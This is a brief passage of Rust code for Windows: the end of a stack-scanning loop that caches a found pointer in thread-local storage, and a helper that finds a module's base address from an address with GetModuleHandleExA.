                let data = tls_get_value(TLS_INDEX) as *mut usize;
                if !data.is_null() {
                    *data = stack_iterator as usize;
                }
                return stack_iterator as usize;
            }
            stack_iterator = stack_iterator.add(1);
            remaining -= 1;
        }
        0
    }
}

fn module_base_from_address(address: usize) -> usize {
    unsafe {
        let mut hmodule = HMODULE::default();
        let flags =
            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT;
        let addr = PCSTR(address as *const u8);
        if GetModuleHandleExA(flags, addr, &mut hmodule).is_ok() {
            hmodule.0 as usize
        } else {
            0
        }
    }
}

```